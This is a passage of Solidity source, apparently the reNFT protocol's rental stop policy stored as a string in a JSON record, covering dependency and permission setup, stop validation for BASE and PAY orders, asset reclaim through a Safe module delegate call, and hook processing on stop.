modules that the policy depends on.\n     *         If a module is ever upgraded that this policy depends on, the kernel will\n     *         call this function again to ensure this policy has the current address\n     *         of the module.\n     *\n     * @return dependencies Array of keycodes which represent modules that\n     *                      this policy depends on.\n     */\n    function configureDependencies()\n        external\n        override\n        onlyKernel\n        returns (Keycode[] memory dependencies)\n    {\n        dependencies = new Keycode[](2);\n\n        dependencies[0] = toKeycode(\"STORE\");\n        STORE = Storage(getModuleAddress(toKeycode(\"STORE\")));\n\n        dependencies[1] = toKeycode(\"ESCRW\");\n        ESCRW = PaymentEscrow(getModuleAddress(toKeycode(\"ESCRW\")));\n    }\n\n    /**\n     * @notice Upon policy activation, permissions are requested from the kernel to access\n     *         particular keycode <> function selector pairs. Once these permissions are\n     *         granted, they do not change and can only be revoked when the policy is\n     *         deactivated by the kernel.\n     *\n     * @return requests Array of keycode <> function selector pairs which represent\n     *                  permissions for the policy.\n     */\n    function requestPermissions()\n        external\n        view\n        override\n        onlyKernel\n        returns (Permissions[] memory requests)\n    {\n        requests = new Permissions[](4);\n        requests[0] = Permissions(toKeycode(\"STORE\"), STORE.removeRentals.selector);\n        requests[1] = Permissions(toKeycode(\"STORE\"), STORE.removeRentalsBatch.selector);\n        requests[2] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePayment.selector);\n        requests[3] = Permissions(toKeycode(\"ESCRW\"), ESCRW.settlePaymentBatch.selector);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            Internal Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @dev Helper function to emit an event which signals a rental order has stopped.\n     *\n     * @param seaportOrderHash Order hash of the seaport order.\n     * @param stopper Address which stopped the rental order.\n     */\n    function _emitRentalOrderStopped(bytes32 seaportOrderHash, address stopper) internal {\n        // Wmit the event.\n        emit Events.RentalOrderStopped(seaportOrderHash, stopper);\n    }\n\n    /**\n     * @dev Validates that a rental order can be stopped. Whether an order\n     *      can be stopped is dependent on the type of order. BASE orders can\n     *      be stopped only when the rental has expired. PAY orders can be stopped\n     *      by the lender at any point in the time.\n     *\n     * @param orderType Order type of the rental order to stop.\n     * @param endTimestamp Timestamp that the rental will end.\n     * @param expectedLender Address of the initial lender in the order.\n     */\n    function _validateRentalCanBeStoped(\n        OrderType orderType,\n        uint256 endTimestamp,\n        address expectedLender\n    ) internal view {\n        // Determine if the order has expired.\n        bool hasExpired = endTimestamp <= block.timestamp;\n\n        // Determine if the fulfiller is the lender of the order.\n        bool isLender = expectedLender == msg.sender;\n\n        // BASE orders processing.\n        if (orderType.isBaseOrder()) {\n            // check that the period for the rental order has expired.\n            if (!hasExpired) {\n                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);\n            }\n        }\n        // PAY order processing.\n        else if (orderType.isPayOrder()) {\n            // If the stopper is the lender, then it doesnt matter whether the rental\n            // has expired. But if the stopper is not the lender, then the rental must have expired.\n            if (!isLender && (!hasExpired)) {\n                revert Errors.StopPolicy_CannotStopOrder(block.timestamp, msg.sender);\n            }\n        }\n        // Revert if given an invalid order type.\n        else {\n            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n        }\n    }\n\n    /**\n     * @dev Since the stop policy is an enabled Gnosis Safe module on all rental safes, it\n     *      can be used to execute a transaction directly from the rental safe which retrieves\n     *      the rented assets. This call bypasses the guard that prevents the assets from being\n     *      transferred.\n     *\n     * @param order Rental order to reclaim the items for.\n     */\n    function _reclaimRentedItems(RentalOrder memory order) internal {\n        // Transfer ERC721s from the renter back to lender.\n        bool success = ISafe(order.rentalWallet).execTransactionFromModule(\n            // Stop policy inherits the reclaimer package.\n            address(this),\n            // value.\n            0,\n            // The encoded call to the `reclaimRentalOrder` function.\n            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),\n            // Safe must delegate call to the stop policy so that it is the msg.sender.\n            Enum.Operation.DelegateCall\n        );\n\n        // Assert that the transfer back to the lender was successful.\n        if (!success) {\n            revert Errors.StopPolicy_ReclaimFailed();\n        }\n    }\n\n    /**\n     * @dev When a rental order is stopped, process each hook one by one but only if\n     *      the hook's status is set to execute on a rental stop.\n     *\n     * @param hooks        Array of hooks to process for the order.\n     * @param rentalItems  Array of rental items which are referenced by the hooks\n     * @param rentalWallet Address of the rental wallet which is the current owner\n     *                     of the rented assets.\n     */\n    function _removeHooks(\n        Hook[] calldata hooks,\n        Item[] calldata rentalItems,\n        address rentalWallet\n    ) internal {\n        // Define hook target, item index, and item.\n        address target;\n        uint256 itemIndex;\n        Item memory item;\n\n        // Loop through each hook in the payload.\n        for (uint256 i = 0; i < hooks.length; ++i) {\n            // Get the hook address.\n            target = hooks[i].target;\n\n            // Check that the hook is reNFT-approved to execute on rental stop.\n            if (!STORE.hookOnStop(target)) {\n                revert Errors.Shared_DisabledHook(target);\n            }\n\n            // Get the rental item index for this hook.\n            itemIndex = hooks[i].itemIndex;\n\n            // Get the rental item for this hook.\n            item = rentalItems[itemIndex];\n\n            // Make sure the item is a rented item.\n            if (!item.isRental()) {\n                revert Errors.Shared_NonRentalHookItem(itemIndex);\n            }\n\n            // Call the hook with data about the rented item.\n            try\n                IHook(target).onStop(\n                    rentalWallet,\n                    item.token,\n                    item.identifier,\n                    item.amount,\n                    hooks[i].extraData\n                )\n            {} catch Error(string memory revertReason) {\n                // Revert with reason given.\n                revert Errors.Shared_HookFailString(revertReason);\n            } catch Panic(uint256 errorCode) {\n                // Convert solidity panic code to string.\n                string memory stringErrorCode = LibString.toString(errorCode);\n\n                // Revert with panic code.\n                revert Errors.Shared_HookFailString(\n                    string.concat(\"Hook reverted: Panic code \", stringErrorCode)\n                );\n            } catch (bytes memory revertD"
    }
  ]
}